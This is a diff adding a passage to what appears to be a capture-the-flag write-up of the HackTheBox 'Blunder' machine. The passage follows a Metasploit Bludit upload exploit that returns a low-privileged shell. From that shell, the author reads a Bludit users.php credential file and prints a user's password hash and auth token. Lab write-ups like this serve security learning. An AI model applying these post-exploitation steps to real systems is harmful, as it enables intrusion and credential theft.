@@ -154,3 +154,33 @@ msf5 exploit(linux/http/bludit_upload_images_exec) > set LHOST tun0
 After running the exploit we grab a low-privileged shell to the machine :
 
 ![www-data](https://raw.githubusercontent.com/pi0x73/pi0x73.github.io/master/assets/images/blunder-writeup/metasploit.png)
+
+Using the shell I just grabbed from the exploit I started to look for possible interesting paths on the machine.
+There seems to be a newer version of Bludit (**3.10**) already installed on the machine but not yet set up on the blog.
+Navigating on it I grabbed a very useful hash from **users.php**
+
+```php
+www-data@blunder:/var/www/bludit-3.10.0a/bl-content/databases$ cat users.php
+cat users.php
+<?php defined('BLUDIT') or die('Bludit CMS.'); ?>
+{
+    "admin": {
+        "nickname": "Hugo",
+        "firstName": "Hugo",
+        "lastName": "",
+        "role": "User",
+        "password": "faca404fd5c0a31cf1897b823c695c85cffeb98d",
+        "email": "",
+        "registered": "2019-11-27 07:40:55",
+        "tokenRemember": "",
+        "tokenAuth": "b380cb62057e9da47afce66b4615107d",
+        "tokenAuthTTL": "2009-03-15 14:00",
+        "twitter": "",
+        "facebook": "",
+        "instagram": "",
+        "codepen": "",
+        "linkedin": "",
+        "github": "",
+        "gitlab": ""}
+}
+```
